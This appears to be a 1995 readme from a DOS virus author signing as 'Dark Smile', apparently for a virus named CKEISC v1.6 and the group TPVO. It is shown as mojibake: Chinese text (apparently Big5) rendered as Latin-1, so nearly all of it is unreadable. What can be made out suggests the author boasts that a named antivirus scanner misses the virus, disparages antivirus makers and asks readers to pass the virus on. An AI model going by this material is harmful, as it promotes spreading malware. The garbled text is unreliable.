     ¤éªº¨º¤@¤Ñ¡A¦pªG±z¬Ý¨ì¤F³o¤@°¦¥i·R¯f¬rªºµo§@°T®§¡A§O§Ñ¤F¥´¶}±z­µ®Ä¥d
     ªº³â¥z¡A²âÅ¥¤@¤U®®¦Õªº³o¤@­º¥Í¤é§Ö¼Öºq­ò¡T¶¶«K§i¶D¦U¦ì¤@­Ó¦n®ø®§¡A´N
     ¬O§Ú¥[¤J¤F¡uTPVO¡v¡A§Ú­Ì²ÕÂ´¬O³W©w¤£¯à¼g¦³¯}Ãa¤Oªº¯f¬r¡A©Ò¥H¦U¦ì¥i¥H
     ©ñ¤ß¤F¡A¥H«á§Ú¼g¬r¥u­n¬O¥H TPVO ªº¦W¸q¼gªº¬r¡A´N¤£·|¦³¯}Ãa¥\¯à°Õ¡T

     ¤]³\¦³¤H·|°Ý¡A§Ú¬°¤°»ò·|¼g¯f¬r¡A¨Æ¹ê¤W¡A¬O¬°¤F¤£·QÅý¥xÆWªº¡u«þ¨©¡v­·
     ®ð¦p¦¹²±¦æ¡A¦³¨Ç¤H»~¥H¬°¨¾¬rµ{¦¡¸U¯à¡A¥u­n¦³¦nªº¨¾¬rµ{¦¡¡A´N¥i¥H¬°«D
     §@¤ï.... §Ú¤@ª½Ä±±o¨¾¬rµ{¦¡¦ü¥G¨S¦³¦s¦bªº¥²­n¡A¦pªG§A¦³¡uºØ¡v¶Ã¡u«þ¡v
     ¨º§A¤]´N­n¦³¡uºØ¡v©Ó¾á¤¤¬rªº«áªG¡T¦Ü©ó°µ¨¾¬rµ{¦¡ªº¤H¡A¦pªG§A­Ì¥u±þ¤Ó
     ¹L¥÷ªº¯f¬r´Nºâ¤F¡A«o¬O¤°»ò¬r³£±þ,¤]³\§A­Ì­n»¡¬°¤F¨Ï¥ÎªÌªºÅv§Q¡A¤£¹L§Ú
     ·Q¥»¨Ó¨¾¬rµ{¦¡´N¤£À³¸Ó®³¨Ó½æ¿ú¡A¬JµM§A­Ì­n®³¨Ó½æ¿ú¡A¤]´NÀ³¸ò¨Ï¥ÎªÌ»¡
     ©ú²M·¡¡A²¦³º­n¤£­n¶R¬O¥LªºÅv§Q¡A¦pªG¼g¨¾¬rµ{¦¡ªº¦U¦ìÁÙ¤´¤£¯à·Q³qªº¸Ü,
     ¤£ª¾¹D¨º¤@¤Ñ°_¡A§A­Ì¤]¯à¬Ý¨ì¦Û¤v¨¯¨¯­W­W¼gªºµ{¦¡³Q¤@¨Ç¤H¶Ã¡u«þ¡v¡A¨ì
     ¨º­Ó®É­Ô¡A«á®¬´N¨Ó¤£¤Î¤F¡T

     ¤]§Æ±æ¬Ý¨ì³o¤@½g»¡©úÀÉªº¡u¤@¯ë¡v¨Ï¥ÎªÌ¡A¨¾¬rµ{¦¡¨Ã¤£¬O¸U¯àªº¡A¦pªG§A
     ¤£¬Û«H¡A¨º´NÅý§Ú­Ì  TPVO ÃÒ©úµ¹§A¬Ý¡T¦pªG§A¦Û¤v¨S¦³¡u¨¾¬r¡vªº¯à¤O¡A¥i
     ¤d¸U§O¦A¶Ã¡u«þ¡v³nÅé°Õ¡A§_«hªº¸Ü.... «áªG¦Û¦æ­t³d¡T(PS. §Ú¥Î PVSCAN
     1.9f ¦ü¥GÁÙ±½¤£¨ì³o¤@°¦¬r¡A¦b±z¬Ý¨ì³o¤@­Ó»¡©úÀÉ®É¡A¥Nªí³o¤@°¦¬r¤w¶Ç¥X
     ¥h¡A»°§Ö¦¬¤â§O¦A¶Ã«þ¤F§a¡T)

     ³Ì«á¡A§â§Ú¥¼¶Ç¥X¥hªº 1.6 ª©»¡©úÀÉªþ¤W¡Aµ¹¦U¦ì§K¶O°Ñ¦Ò§a¡T

                                                  By Dark Smile 1995/05/07

     CKEISC v1.6

     «¢¡T§Ú§V¤O¤F¤­¤Ñ¡A²×©ó¼g¥X¤F³o¤@°¦¯f¬r¤F¡T¥»¨Ó¹w­p¬O¨â¤Ñ´N¥i¥Hªº¡A¤£
     ¹L³o¤§¤¤¹J¤W¤F­p¦h³Â·Ð¡A¥H¤Î¤@¨Ç§Þ³N¤Wªº¬ð¯}¡Aªá¤F§Ú¤£¤Öªº®É¶¡¦b´ú¸Õ
     ¤W¡A¥»¨Ó¬OÀ³¸Ó¥X 1.5 ª©ªº¡A¦ý¬O¦³¤F¤@¨Ç°ÝÃD¡A©Ò¥H´N¡u­L¦º¸¡¤¤¡v¤F¡A¸g
     ¹L§Ú§Ôµh³Î·R¤§«á¡A§â¤@¨Ç¦a¤è§R°£¤]¤~¶¶§Qªº°µ¥X³o¤@°¦ 1.6 ª©¡A¤£¹L¨ä¤¤
     ÁÙ¦³¨Ç¤°»ò°ÝÃD§Ú­Ë¤]ÁÙ¤£ª¾¹D¡A§Æ±æ¦U¦ì°ª©ú¥i¥H«üÂI¤@¤U¡A«Ø¤¤ªº¾Ç³Nºô
     ¸ô¤]§Ö¶}©ñ¤F¡A¦pªG¦³¤°»ò¸Ü­n¸ò§Ú»¡ªº¸Ü¡A´N½Ð¼g«H¨ì 203.64.26.1 ¨ì®É­Ô
     À³·|¦³¤@­Ó¡u¹q¬ãªÀ°Q½×°Ï¡v¤§Ãþªº¡A©Î³\·|¦³¡u¹q¸£¯f¬r°Q½×°Ï¡v¤]»¡¤£©w¡A
     ¨ì®É­Ô§Ú¦pªG¦³ªÅ´N·|¥h¬Ý¤@¤U¡C

     ¦b³o¤@¦¸ªº¼¶¼g¤¤¡A§Úµo²{¦b DOS ¤Uªº­­¨î»á¦h¡A¦Ó¥B±`±`·|¤£ª¾¦W¦a¡u·í¾÷
     ¡v¹ê¦b¬O... ¡C¤£¹L§ÚÁ`ºâÁÙ¬O¼õ¹L¨Ó¤F¡T³o¥u¬O¤@°¦´ú¸Õ¥H¤Î®i¥Ü§Ú­Ì¡u«Ø
     ¤¤¹q¬ãªÀ¡v¼gµ{¦¡¥\¤Oªº¯f¬r¡A«ö±`²z¨Ó»¡À³¬O¤£·|¹ï±zªº¨t²Î³y¦¨¥ô¦óªº¶Ë
     ®`¡A¦ý¬O¦]¬°§ÚÃi±o´ú¸Õ¤F¡A©Ò¥H¨s³º·|¤£·|¦³§Ú¤]¤£´±½T©w¡A¤£¹L§Ú¥i¥H½T
     ©wªº¬O§Úªºµ{¦¡½X¤¤¨S¦³¨è·N¼g¤J·|¶Ë®`¨t²Îªºµ{¦¡½X¡A§A¦pªG¤£¬Û«H¥i¥H·Q
     ¿ìªk¤Ï²ÕÄ¶¥X¨Ó¬Ý¬Ý¡A´N³sµo§@¤]¥u¬O¦bµe­±¤W¦L¥X¤@¨Ç¦r½}¤F¡T

     ¬JµM¨S¤°»ò¶Ë®`¡A¦U¦ì¶Ç¼½¯f¬rªº¤j¼w­Ì¡A¥i§_À°¤p§Ì§Ú¥N¶Ç¤@¤U¡A¦]¬°§Ú¯u
     ªº«Ü§Æ±æ¦³¦h¤@ÂI¤H®³¨ì¥¦¡A¤~¯àµ¹§Ú¤@¨Ç·N¨£¡A¦pªG¦³¤°»ò¤H§ä¨ì¤°»ò¡uBUG
     ¡v¤]³Â·Ð§iª¾¤@¤U¡A§Ú·|¾¨¶q§ä®É¶¡¥h§ïª©ªº¡T¦b¦¹´N¥ýÁÂ¹L¦U¦ì°Õ¡T^_^

     ¤]³\¦³¤H·|°Ý¡A§Ú¦³¨S¦³¸Ñ¬r¾¯¡S¤£¦n·N«ä¡A§Ú³s´ú¸Õ³£Ãi±o´ú¤F¡A«ç»òÁÙ·|
     ¦³¶¢¥h¼g³o­ÓªFªF¡T©Ò¥H´N¦³³Ò¡u¶À·ç±j¡v¤j­ô¡A©M¡u¶¾¤å«T¡v¤j­ôµ¥¨¾¬rµ{
     ¦¡ªº§@ªÌ­Ì°Õ¡T¤£ª¾§Ú¥s§A­Ì¤j­ô§A­Ì·|¤£·|¤¶·N¡A§Ú¤~¤Q¤»·³¹À¡T^_^

                                                  By Dark Smile 1995/04/07

